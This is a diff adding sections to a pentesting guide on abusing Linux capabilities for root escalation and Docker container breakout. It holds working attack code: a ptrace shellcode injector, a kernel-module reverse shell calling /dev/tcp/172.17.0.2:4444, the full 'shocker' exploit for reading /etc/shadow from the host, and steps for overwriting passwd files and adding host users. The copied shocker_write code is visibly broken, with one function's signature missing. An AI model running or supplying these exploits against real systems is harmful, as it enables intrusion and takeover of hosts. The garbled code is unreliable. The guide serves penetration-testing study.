@@ -372,6 +372,726 @@ Note that one can assign empty capability sets to a program file, and thus it is
 
 then that binary will run as root.
 
+### CAP\_SYS\_ADMIN
+
+**This means that you can** **mount/umount filesystems.**
+
+#### Example with binary
+
+```bash
+getcap -r / 2>/dev/null
+/usr/bin/python2.7 = cap_sys_admin+ep
+```
+
+Using python you can mount a modified _passwd_ file on top of the real _passwd_ file:
+
+```bash
+cp /etc/passwd ./ #Create a copy of the passwd file
+openssl passwd -1 -salt abc password #Get hash of "password"
+vim ./passwd #Change roots passwords of the fake passwd file
+```
+
+And finally **mount** the modified `passwd` file on `/etc/passwd`:
+
+```python
+from ctypes import *
+libc = CDLL("libc.so.6")
+libc.mount.argtypes = (c_char_p, c_char_p, c_char_p, c_ulong, c_char_p)
+MS_BIND = 4096
+source = b"/path/to/fake/passwd"
+target = b"/etc/passwd"
+filesystemtype = b"none"
+options = b"rw"
+mountflags = MS_BIND
+libc.mount(source, target, filesystemtype, mountflags, options)
+```
+
+And you will be able to **`su` as root** using password "password".
+
+#### Example with environment \(Docker breakout\)
+
+You can check the enabled capabilities inside the docker container using:
+
+```text
+capsh --print
+Current: = cap_chown,cap_dac_override,cap_dac_read_search,cap_fowner,cap_fsetid,cap_kill,cap_setgid,cap_setuid,cap_setpcap,cap_linux_immutable,cap_net_bind_service,cap_net_broadcast,cap_net_admin,cap_net_raw,cap_ipc_lock,cap_ipc_owner,cap_sys_module,cap_sys_rawio,cap_sys_chroot,cap_sys_ptrace,cap_sys_pacct,cap_sys_admin,cap_sys_boot,cap_sys_nice,cap_sys_resource,cap_sys_time,cap_sys_tty_config,cap_mknod,cap_lease,cap_audit_write,cap_audit_control,cap_setfcap,cap_mac_override,cap_mac_admin,cap_syslog,cap_wake_alarm,cap_block_suspend,cap_audit_read+ep
+Bounding set =cap_chown,cap_dac_override,cap_dac_read_search,cap_fowner,cap_fsetid,cap_kill,cap_setgid,cap_setuid,cap_setpcap,cap_linux_immutable,cap_net_bind_service,cap_net_broadcast,cap_net_admin,cap_net_raw,cap_ipc_lock,cap_ipc_owner,cap_sys_module,cap_sys_rawio,cap_sys_chroot,cap_sys_ptrace,cap_sys_pacct,cap_sys_admin,cap_sys_boot,cap_sys_nice,cap_sys_resource,cap_sys_time,cap_sys_tty_config,cap_mknod,cap_lease,cap_audit_write,cap_audit_control,cap_setfcap,cap_mac_override,cap_mac_admin,cap_syslog,cap_wake_alarm,cap_block_suspend,cap_audit_read
+Securebits: 00/0x0/1'b0
+ secure-noroot: no (unlocked)
+ secure-no-suid-fixup: no (unlocked)
+ secure-keep-caps: no (unlocked)
+uid=0(root)
+gid=0(root)
+groups=0(root)
+```
+
+Inside the previous output you can see that the SYS\_ADMIN capability is enabled.
+
+* **Mount**
+
+This allows the docker container to **mount the host disk and access it freely**:
+
+```bash
+fdisk -l #Get disk name
+Disk /dev/sda: 4 GiB, 4294967296 bytes, 8388608 sectors
+Units: sectors of 1 * 512 = 512 bytes
+Sector size (logical/physical): 512 bytes / 512 bytes
+I/O size (minimum/optimal): 512 bytes / 512 bytes
+
+mount /dev/sda /mnt/ #Mount it
+cd /mnt
+chroot ./ bash #You have a shell inside the docker hosts disk
+```
+
+* **Full access**
+
+In the previous method we managed to access the docker host disk.  
+In case you find that the host is running an **ssh** server, you could **create a user inside the docker host** disk and access it via SSH:
+
+```bash
+#Like in the example before, the first step is to moun the dosker host disk
+fdisk -l
+mount /dev/sda /mnt/
+
+#Then, search for open ports inside the docker host
+nc -v -n -w2 -z 172.17.0.1 1-65535
+(UNKNOWN) [172.17.0.1] 2222 (?) open
+
+#Finally, create a new user inside the docker host and use it to access via SSH
+chroot /mnt/ adduser john
+ssh john@172.17.0.1 -p 2222
+```
+
+### CAP\_SYS\_PTRACE
+
+**This means that you can escape the container by injecting a shellcode inside some process running inside the host.**
+
+#### Example with binary
+
+```bash
+getcap -r / 2>/dev/null
+/usr/bin/python2.7 = cap_sys_ptrace+ep
+```
+
+```python
+import ctypes
+import sys
+import struct
+# Macros defined in <sys/ptrace.h>
+# https://code.woboq.org/qt5/include/sys/ptrace.h.html
+PTRACE_POKETEXT = 4
+PTRACE_GETREGS = 12
+PTRACE_SETREGS = 13
+PTRACE_ATTACH = 16
+PTRACE_DETACH = 17
+# Structure defined in <sys/user.h>
+# https://code.woboq.org/qt5/include/sys/user.h.html#user_regs_struct
+class user_regs_struct(ctypes.Structure):
+    _fields_ = [
+        ("r15", ctypes.c_ulonglong),
+        ("r14", ctypes.c_ulonglong),
+        ("r13", ctypes.c_ulonglong),
+        ("r12", ctypes.c_ulonglong),
+        ("rbp", ctypes.c_ulonglong),
+        ("rbx", ctypes.c_ulonglong),
+        ("r11", ctypes.c_ulonglong),
+        ("r10", ctypes.c_ulonglong),
+        ("r9", ctypes.c_ulonglong),
+        ("r8", ctypes.c_ulonglong),
+        ("rax", ctypes.c_ulonglong),
+        ("rcx", ctypes.c_ulonglong),
+        ("rdx", ctypes.c_ulonglong),
+        ("rsi", ctypes.c_ulonglong),
+        ("rdi", ctypes.c_ulonglong),
+        ("orig_rax", ctypes.c_ulonglong),
+        ("rip", ctypes.c_ulonglong),
+        ("cs", ctypes.c_ulonglong),
+        ("eflags", ctypes.c_ulonglong),
+        ("rsp", ctypes.c_ulonglong),
+        ("ss", ctypes.c_ulonglong),
+        ("fs_base", ctypes.c_ulonglong),
+        ("gs_base", ctypes.c_ulonglong),
+        ("ds", ctypes.c_ulonglong),
+        ("es", ctypes.c_ulonglong),
+        ("fs", ctypes.c_ulonglong),
+        ("gs", ctypes.c_ulonglong),
+    ]
+    
+libc = ctypes.CDLL("libc.so.6")
+
+pid=int(sys.argv[1])
+
+# Define argument type and respone type.
+libc.ptrace.argtypes = [ctypes.c_uint64, ctypes.c_uint64, ctypes.c_void_p, ctypes.c_void_p]
+libc.ptrace.restype = ctypes.c_uint64
+
+# Attach to the process
+libc.ptrace(PTRACE_ATTACH, pid, None, None)
+registers=user_regs_struct()
+
+# Retrieve the value stored in registers
+libc.ptrace(PTRACE_GETREGS, pid, None, ctypes.byref(registers))
+print("Instruction Pointer: " + hex(registers.rip))
+print("Injecting Shellcode at: " + hex(registers.rip))
+
+# Shell code copied from exploit db. https://github.com/0x00pf/0x00sec_code/blob/master/mem_inject/infect.c
+shellcode = "\x48\x31\xc0\x48\x31\xd2\x48\x31\xf6\xff\xc6\x6a\x29\x58\x6a\x02\x5f\x0f\x05\x48\x97\x6a\x02\x66\xc7\x44\x24\x02\x15\xe0\x54\x5e\x52\x6a\x31\x58\x6a\x10\x5a\x0f\x05\x5e\x6a\x32\x58\x0f\x05\x6a\x2b\x58\x0f\x05\x48\x97\x6a\x03\x5e\xff\xce\xb0\x21\x0f\x05\x75\xf8\xf7\xe6\x52\x48\xbb\x2f\x62\x69\x6e\x2f\x2f\x73\x68\x53\x48\x8d\x3c\x24\xb0\x3b\x0f\x05"
+
+# Inject the shellcode into the running process byte by byte.
+for i in xrange(0,len(shellcode),4):
+    # Convert the byte to little endian.
+    shellcode_byte_int=int(shellcode[i:4+i].encode('hex'),16)
+    shellcode_byte_little_endian=struct.pack("<I", shellcode_byte_int).rstrip('\x00').encode('hex')
+    shellcode_byte=int(shellcode_byte_little_endian,16)
+    
+    # Inject the byte.
+    libc.ptrace(PTRACE_POKETEXT, pid, ctypes.c_void_p(registers.rip+i),shellcode_byte)
+
+print("Shellcode Injected!!")
+
+# Modify the instuction pointer
+registers.rip=registers.rip+2
+
+# Set the registers
+libc.ptrace(PTRACE_SETREGS, pid, None, ctypes.byref(registers))
+print("Final Instruction Pointer: " + hex(registers.rip))
+
+# Detach from the process.
+libc.ptrace(PTRACE_DETACH, pid, None, None)
+```
+
+#### Example with environment \(Docker breakout\)
+
+You can check the enabled capabilities inside the docker container using:
+
+```text
+capsh --print
+Current: = cap_chown,cap_dac_override,cap_fowner,cap_fsetid,cap_kill,cap_setgid,cap_setuid,cap_setpcap,cap_net_bind_service,cap_net_raw,cap_sys_chroot,cap_sys_ptrace,cap_mknod,cap_audit_write,cap_setfcap+ep
+Bounding set =cap_chown,cap_dac_override,cap_fowner,cap_fsetid,cap_kill,cap_setgid,cap_setuid,cap_setpcap,cap_net_bind_service,cap_net_raw,cap_sys_chroot,cap_sys_ptrace,cap_mknod,cap_audit_write,cap_setfcap
+Securebits: 00/0x0/1'b0
+ secure-noroot: no (unlocked)
+ secure-no-suid-fixup: no (unlocked)
+ secure-keep-caps: no (unlocked)
+uid=0(root)
+gid=0(root)
+groups=0(root
+```
+
+List **processes** running in the **host** `ps -eaf`
+
+1. Get the **architecture** `uname -m`
+2. Find a **shellcode** for the architecture \([https://www.exploit-db.com/exploits/41128](https://www.exploit-db.com/exploits/41128)\)
+3. Find a **program** to **inject** the **shellcode** into a process memory \([https://github.com/0x00pf/0x00sec\_code/blob/master/mem\_inject/infect.c](https://github.com/0x00pf/0x00sec_code/blob/master/mem_inject/infect.c)\)
+4. **Modify** the **shellcode** inside the program and **compile** it `gcc inject.c -o inject`
+5. **Inject** it and grab your **shell**: `./inject 299; nc 172.17.0.1 5600`
+
+### CAP\_SYS\_MODULE
+
+**This means that you can** **insert/remove kernel modules in/from the kernel of the host machine.**
+
+#### Example with binary
+
+In the following example the binary **`python`** has this capability.
+
+```bash
+getcap -r / 2>/dev/null
+/usr/bin/python2.7 = cap_sys_module+ep
+```
+
+By default, **`modprobe`** command checks for dependency list and map files in the directory **`/lib/modules/$(uname -r)`**.  
+In order to abuse this, lets create a fake **lib/modules** folder:
+
+```bash
+mkdir lib/modules -p
+cp -a /lib/modules/5.0.0-20-generic/ lib/modules/$(uname -r)
+```
+
+Then **compile the kernel module you can find 2 examples below and copy** it to this folder:
+
+```bash
+cp reverse-shell.ko lib/modules/$(uname -r)/
+```
+
+Finally, execute the needed python code to load this kernel module:
+
+```python
+import kmod
+km = kmod.Kmod()
+km.set_mod_dir("/path/to/fake/lib/modules/5.0.0-20-generic/")
+km.modprobe("reverse-shell")
+```
+
+#### Example 2 with binary
+
+In the following example the binary **`kmod`** has this capability.
+
+```bash
+getcap -r / 2>/dev/null
+/bin/kmod = cap_sys_module+ep
+```
+
+Which means that it's possible to use the command **`insmod`** to insert a kernel module. Follow the example below to get a **reverse shell** abusing this privilege.
+
+#### Example with environment \(Docker breakout\)
+
+You can check the enabled capabilities inside the docker container using:
+
+```text
+capsh --print
+Current: = cap_chown,cap_dac_override,cap_fowner,cap_fsetid,cap_kill,cap_setgid,cap_setuid,cap_setpcap,cap_net_bind_service,cap_net_raw,cap_sys_module,cap_sys_chroot,cap_mknod,cap_audit_write,cap_setfcap+ep
+Bounding set =cap_chown,cap_dac_override,cap_fowner,cap_fsetid,cap_kill,cap_setgid,cap_setuid,cap_setpcap,cap_net_bind_service,cap_net_raw,cap_sys_module,cap_sys_chroot,cap_mknod,cap_audit_write,cap_setfcap
+Securebits: 00/0x0/1'b0
+ secure-noroot: no (unlocked)
+ secure-no-suid-fixup: no (unlocked)
+ secure-keep-caps: no (unlocked)
+uid=0(root)
+gid=0(root)
+groups=0(root)
+```
+
+Inside the previous output you can see that the **SYS\_MODULE** capability is enabled.
+
+**Create** the **kernel module** that is going to execute a reverse shell and the **Makefile** to **compile** it:
+
+{% code title="reverse-shell.c" %}
+```c
+#include <linux/kmod.h>
+#include <linux/module.h>
+MODULE_LICENSE("GPL");
+MODULE_AUTHOR("AttackDefense");
+MODULE_DESCRIPTION("LKM reverse shell module");
+MODULE_VERSION("1.0");
+
+char* argv[] = {"/bin/bash","-c","bash -i >& /dev/tcp/172.17.0.2/4444 0>&1", NULL};
+static char* envp[] = {"PATH=/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin", NULL };
+
+// call_usermodehelper function is used to create user mode processes from kernel space
+static int __init reverse_shell_init(void) {
+    return call_usermodehelper(argv[0], argv, envp, UMH_WAIT_EXEC);
+}
+
+static void __exit reverse_shell_exit(void) {
+    printk(KERN_INFO "Exiting\n");
+}
+
+module_init(reverse_shell_init);
+module_exit(reverse_shell_exit);
+```
+{% endcode %}
+
+{% code title="Makefile" %}
+```bash
+obj-m +=reverse-shell.o
+
+all:
+    make -C /lib/modules/$(shell uname -r)/build M=$(PWD) modules
+
+clean:
+    make -C /lib/modules/$(shell uname -r)/build M=$(PWD) clean
+```
+{% endcode %}
+
+{% hint style="warning" %}
+The blank char before each make word in the Makefile **must be a tab, not spaces**!
+{% endhint %}
+
+Execute `make` to compile it.
+
+Finally, start `nc` inside a shell and **load the module** from another one and you will capture the shell in the nc process:
+
+```bash
+#Shell 1
+nc -lvnp 4444
+
+#Shell 2
+insmod reverse-shell.ko #Launch the reverse shell
+```
+
+**The code of this technique was copied from the laboratory of "Abusing SYS\_MODULE Capability" from** [**https://www.pentesteracademy.com/**](https://www.pentesteracademy.com/)
+
+### CAP\_DAC\_READ\_SEARCH
+
+**This means that you can** **bypass can bypass file read permission checks and directory read/execute permission checks.**
+
+#### Example with binary
+
+The binary will be able to read any file. So, if a file like tar has this capability it will be able to read the shadow file:
+
+```bash
+cd /etc
+tar -czf /tmp/shadow.tar.gz shadow #Compress show file in /tmp
+cd /tmp
+tar -cxf shadow.tar.gz
+```
+
+#### Example with ****Environment \(Docker breakout\)
+
+You can check the enabled capabilities inside the docker container using:
+
+```text
+capsh --print
+Current: = cap_chown,cap_dac_override,cap_dac_read_search,cap_fowner,cap_fsetid,cap_kill,cap_setgid,cap_setuid,cap_setpcap,cap_net_bind_service,cap_net_raw,cap_sys_chroot,cap_mknod,cap_audit_write,cap_setfcap+ep
+Bounding set =cap_chown,cap_dac_override,cap_dac_read_search,cap_fowner,cap_fsetid,cap_kill,cap_setgid,cap_setuid,cap_setpcap,cap_net_bind_service,cap_net_raw,cap_sys_chroot,cap_mknod,cap_audit_write,cap_setfcap
+Securebits: 00/0x0/1'b0
+ secure-noroot: no (unlocked)
+ secure-no-suid-fixup: no (unlocked)
+ secure-keep-caps: no (unlocked)
+uid=0(root)
+gid=0(root)
+groups=0(root)
+```
+
+Inside the previous output you can see that the **DAC\_READ\_SEARCH** capability is enabled. As a result, the container can **debug processes**. 
+
+You can learn how the following exploiting works in [https://medium.com/@fun\_cuddles/docker-breakout-exploit-analysis-a274fff0e6b3](https://medium.com/@fun_cuddles/docker-breakout-exploit-analysis-a274fff0e6b3) but in resume  **CAP\_DAC\_READ\_SEARCH**  not only allows us to traverse the file system without permission checks, but also explicitly removes any checks to _**open\_by\_handle\_at\(2\)**_ and **could allow our process to sensitive files opened by other processes**.
+
+The original exploit that abuse this permissions to read files from the host can be found here: [http://stealth.openwall.net/xSports/shocker.c](http://stealth.openwall.net/xSports/shocker.c), the following is a **modified version that allows you to indicate the file you want to read as first argument and dump it in a file.**
+
+```c
+#include <stdio.h>
+#include <sys/types.h>
+#include <sys/stat.h>
+#include <fcntl.h>
+#include <errno.h>
+#include <stdlib.h>
+#include <string.h>
+#include <unistd.h>
+#include <dirent.h>
+#include <stdint.h>
+
+// gcc shocker.c -o shocker
+// ./socker /etc/shadow shadow #Read /etc/shadow from host and save result in shadow file in current dir
+
+struct my_file_handle {
+  unsigned int handle_bytes;
+  int handle_type;
+  unsigned char f_handle[8];
+};
+
+void die(const char * msg) {
+  perror(msg);
+  exit(errno);
+}
+
+void dump_handle(const struct my_file_handle * h) {
+  fprintf(stderr, "[*] #=%d, %d, char nh[] = {", h -> handle_bytes,
+    h -> handle_type);
+  for (int i = 0; i < h -> handle_bytes; ++i) {
+    fprintf(stderr, "0x%02x", h -> f_handle[i]);
+    if ((i + 1) % 20 == 0)
+      fprintf(stderr, "\n");
+    if (i < h -> handle_bytes - 1)
+      fprintf(stderr, ", ");
+  }
+  fprintf(stderr, "};\n");
+}
+
+int find_handle(int bfd,
+  const char * path,
+    const struct my_file_handle * ih, struct my_file_handle *
+      oh) {
+  int fd;
+  uint32_t ino = 0;
+  struct my_file_handle outh = {
+    .handle_bytes = 8,
+    .handle_type = 1
+  };
+  DIR * dir = NULL;
+  struct dirent * de = NULL;
+  path = strchr(path, '/');
+  // recursion stops if path has been resolved
+  if (!path) {
+    memcpy(oh -> f_handle, ih -> f_handle, sizeof(oh -> f_handle));
+    oh -> handle_type = 1;
+    oh -> handle_bytes = 8;
+    return 1;
+  }
+  ++path;
+  fprintf(stderr, "[*] Resolving '%s'\n", path);
+  if ((fd = open_by_handle_at(bfd, (struct file_handle * ) ih, O_RDONLY)) < 0)
+    die("[-] open_by_handle_at");
+  if ((dir = fdopendir(fd)) == NULL)
+    die("[-] fdopendir");
+  for (;;) {
+    de = readdir(dir);
+    if (!de)
+      break;
+    fprintf(stderr, "[*] Found %s\n", de -> d_name);
+    if (strncmp(de -> d_name, path, strlen(de -> d_name)) == 0) {
+      fprintf(stderr, "[+] Match: %s ino=%d\n", de -> d_name, (int) de -> d_ino);
+      ino = de -> d_ino;
+      break;
+    }
+  }
+
+  fprintf(stderr, "[*] Brute forcing remaining 32bit. This can take a while...\n");
+  if (de) {
+    for (uint32_t i = 0; i < 0xffffffff; ++i) {
+      outh.handle_bytes = 8;
+      outh.handle_type = 1;
+      memcpy(outh.f_handle, & ino, sizeof(ino));
+      memcpy(outh.f_handle + 4, & i, sizeof(i));
+      if ((i % (1 << 20)) == 0)
+        fprintf(stderr, "[*] (%s) Trying: 0x%08x\n", de -> d_name, i);
+      if (open_by_handle_at(bfd, (struct file_handle * ) & outh, 0) > 0) {
+        closedir(dir);
+        close(fd);
+        dump_handle( & outh);
+        return find_handle(bfd, path, & outh, oh);
+      }
+    }
+  }
+  closedir(dir);
+  close(fd);
+  return 0;
+}
+
+int main(int argc, char * argv[]) {
+  char buf[0x1000];
+  int fd1, fd2;
+  struct my_file_handle h;
+  struct my_file_handle root_h = {
+    .handle_bytes = 8,
+    .handle_type = 1,
+    .f_handle = {
+      0x02,
+      0,
+      0,
+      0,
+      0,
+      0,
+      0,
+      0
+    }
+  };
+  fprintf(stderr, "[***] docker VMM-container breakout Po(C) 2014 [***]\n"
+    "[***] The tea from the 90's kicks your sekurity again. [***]\n"
+    "[***] If you have pending sec consulting, I'll happily [***]\n"
+    "[***] forward to my friends who drink secury-tea too! [***]\n\n<enter>\n");
+  read(0, buf, 1);
+  // get a FS reference from something mounted in from outside
+  if ((fd1 = open("/etc/hostname", O_RDONLY)) < 0)
+    die("[-] open");
+  if (find_handle(fd1, argv[1], & root_h, & h) <= 0)
+    die("[-] Cannot find valid handle!");
+  fprintf(stderr, "[!] Got a final handle!\n");
+  dump_handle( & h);
+  if ((fd2 = open_by_handle_at(fd1, (struct file_handle * ) & h, O_RDWR)) < 0)
+    die("[-] open_by_handle");
+  char * line = NULL;
+  size_t len = 0;
+  FILE * fptr;
+  ssize_t read;
+  fptr = fopen(argv[2], "r");
+  while ((read = getline( & line, & len, fptr)) != -1) {
+    write(fd2, line, read);
+  }
+  printf("Success!!\n");
+  close(fd2);
+  close(fd1);
+  return 0;
+}
+```
+
+{% hint style="danger" %}
+I exploit needs to find a pointer to something mounted on the host. The original exploit used the file `/.dockerinit` and this modified version uses `/etc/hostname`. **If the exploit isn't working** maybe you need to set a different file. To find a file that is mounted in the host just execute `mount` command:
+{% endhint %}
+
+![](../../.gitbook/assets/image%20%28407%29.png)
+
+**The code of this technique was copied from the laboratory of "Abusing DAC\_READ\_SEARCH Capability" from** [**https://www.pentesteracademy.com/**](https://www.pentesteracademy.com/)
+
+### CAP\_DAC\_OVERRIDE
+
+ **This mean that you can bypass write permission checks on any file, so you can write any file.**
+
+#### Example with binary
+
+In this example vim has this capability, so you can modify any file like _passwd_, _sudoers_ or _shadow_:
+
+```bash
+getcap -r / 2>/dev/null
+/usr/bin/vim = cap_dac_override+ep
+
+vim /etc/sudoers #To overwrite it
+```
+
+#### Example with environment + CAP\_DAC\_READ\_SEARCH \(Docker breakout\)
+
+You can check the enabled capabilities inside the docker container using:
+
+```text
+capsh --print
+Current: = cap_chown,cap_dac_override,cap_dac_read_search,cap_fowner,cap_fsetid,cap_kill,cap_setgid,cap_setuid,cap_setpcap,cap_net_bind_service,cap_net_raw,cap_sys_chroot,cap_mknod,cap_audit_write,cap_setfcap+ep
+Bounding set =cap_chown,cap_dac_override,cap_dac_read_search,cap_fowner,cap_fsetid,cap_kill,cap_setgid,cap_setuid,cap_setpcap,cap_net_bind_service,cap_net_raw,cap_sys_chroot,cap_mknod,cap_audit_write,cap_setfcap
+Securebits: 00/0x0/1'b0
+ secure-noroot: no (unlocked)
+ secure-no-suid-fixup: no (unlocked)
+ secure-keep-caps: no (unlocked)
+uid=0(root)
+gid=0(root)
+groups=0(root)
+```
+
+First of all read the previous section that [**abuses DAC\_READ\_SEARCH capability to read arbitrary files**](linux-capabilities.md#cap_dac_read_search) of the host and **compile** the exploit.  
+Then, **compile the following version of the shocker exploit** that ill allow you to **write arbitrary files** inside the hosts filesystem:
+
+```c
+#include <stdio.h>
+#include <sys/types.h>
+#include <sys/stat.h>
+#include <fcntl.h>
+#include <errno.h>
+#include <stdlib.h>
+#include <string.h>
+#include <unistd.h>
+#include <dirent.h>
+#include <stdint.h>
+
+// gcc shocker_write.c -o shocker_write
+// ./shocker_write /etc/passwd passwd 
+
+struct my_file_handle {
+  unsigned int handle_bytes;
+  int handle_type;
+  unsigned char f_handle[8];
+};
+void die(const char * msg) {
+  perror(msg);
+  exit(errno);
+}
+void dump_handle(const struct my_file_handle * h) {
+  fprintf(stderr, "[*] #=%d, %d, char nh[] = {", h -> handle_bytes,
+    h -> handle_type);
+  for (int i = 0; i < h -> handle_bytes; ++i) {
+    fprintf(stderr, "0x%02x", h -> f_handle[i]);
+    if ((i + 1) % 20 == 0)
+      fprintf(stderr, "\n");
+    if (i < h -> handle_bytes - 1)
+      fprintf(stderr, ", ");
+  }
+  fprintf(stderr, "};\n");
+} {
+  int fd;
+  uint32_t ino = 0;
+  struct my_file_handle outh = {
+    .handle_bytes = 8,
+    .handle_type = 1
+  };
+  DIR * dir = NULL;
+  struct dirent * de = NULL;
+  path = strchr(path, '/');
+  // recursion stops if path has been resolved
+  if (!path) {
+    memcpy(oh -> f_handle, ih -> f_handle, sizeof(oh -> f_handle));
+    oh -> handle_type = 1;
+    oh -> handle_bytes = 8;
+    return 1;
+  }
+  ++path;
+  fprintf(stderr, "[*] Resolving '%s'\n", path);
+  if ((fd = open_by_handle_at(bfd, (struct file_handle * ) ih, O_RDONLY)) < 0)
+    die("[-] open_by_handle_at");
+  if ((dir = fdopendir(fd)) == NULL)
+    die("[-] fdopendir");
+  for (;;) {
+    de = readdir(dir);
+    if (!de)
+      break;
+    fprintf(stderr, "[*] Found %s\n", de -> d_name);
+    if (strncmp(de -> d_name, path, strlen(de -> d_name)) == 0) {
+      fprintf(stderr, "[+] Match: %s ino=%d\n", de -> d_name, (int) de -> d_ino);
+      ino = de -> d_ino;
+      break;
+    }
+  }
+  fprintf(stderr, "[*] Brute forcing remaining 32bit. This can take a while...\n");
+  if (de) {
+    for (uint32_t i = 0; i < 0xffffffff; ++i) {
+      outh.handle_bytes = 8;
+      outh.handle_type = 1;
+      memcpy(outh.f_handle, & ino, sizeof(ino));
+      memcpy(outh.f_handle + 4, & i, sizeof(i));
+      if ((i % (1 << 20)) == 0)
+        fprintf(stderr, "[*] (%s) Trying: 0x%08x\n", de -> d_name, i);
+      if (open_by_handle_at(bfd, (struct file_handle * ) & outh, 0) > 0) {
+        closedir(dir);
+        close(fd);
+        dump_handle( & outh);
+        return find_handle(bfd, path, & outh, oh);
+      }
+    }
+  }
+  closedir(dir);
+  close(fd);
+  return 0;
+}
+int main(int argc, char * argv[]) {
+  char buf[0x1000];
+  int fd1, fd2;
+  struct my_file_handle h;
+  struct my_file_handle root_h = {
+    .handle_bytes = 8,
+    .handle_type = 1,
+    .f_handle = {
+      0x02,
+      0,
+      0,
+      0,
+      0,
+      0,
+      0,
+      0
+    }
+  };
+  fprintf(stderr, "[***] docker VMM-container breakout Po(C) 2014 [***]\n"
+    "[***] The tea from the 90's kicks your sekurity again. [***]\n"
+    "[***] If you have pending sec consulting, I'll happily [***]\n"
+    "[***] forward to my friends who drink secury-tea too! [***]\n\n<enter>\n");
+  read(0, buf, 1);
+  // get a FS reference from something mounted in from outside
+  if ((fd1 = open("/etc/hostname", O_RDONLY)) < 0)
+    die("[-] open");
+  if (find_handle(fd1, argv[1], & root_h, & h) <= 0)
+    die("[-] Cannot find valid handle!");
+  fprintf(stderr, "[!] Got a final handle!\n");
+  dump_handle( & h);
+  if ((fd2 = open_by_handle_at(fd1, (struct file_handle * ) & h, O_RDWR)) < 0)
+    die("[-] open_by_handle");
+  char * line = NULL;
+  size_t len = 0;
+  FILE * fptr;
+  ssize_t read;
+  fptr = fopen(argv[2], "r");
+  while ((read = getline( & line, & len, fptr)) != -1) {
+    write(fd2, line, read);
+  }
+  printf("Success!!\n");
+  close(fd2);
+  close(fd1);
+  return 0;
+}
+```
+
+In order to scape the docker container you could **download** the files `/etc/shadow` and `/etc/passwd` from the host, **add** to them a **new user**, and use **`shocker_write`** to overwrite them. Then, **access** via **ssh**.
+
+**The code of this technique was copied from the laboratory of "Abusing DAC\_OVERRIDE Capability" from** [**https://www.pentesteracademy.com/**](https://www.pentesteracademy.com/)
+
+### CAP\_NET\_RAW
+
+**This means that it's possible to capture traffic on network interfaces.**
+
+#### Example with binary
+
+If the binary **`tcpdump`** has this capability you will be able to use it to capture network information.
+
+```bash
+getcap -r / 2>/dev/null
+/usr/sbin/tcpdump = cap_net_raw+ep
+```
+
+Note that if the **environment** is giving this capability you could also use **`tcpdump`** to sniff traffic.
+
 ## References
 
 * [https://vulp3cula.gitbook.io/hackers-grimoire/post-exploitation/privesc-linux](https://vulp3cula.gitbook.io/hackers-grimoire/post-exploitation/privesc-linux)
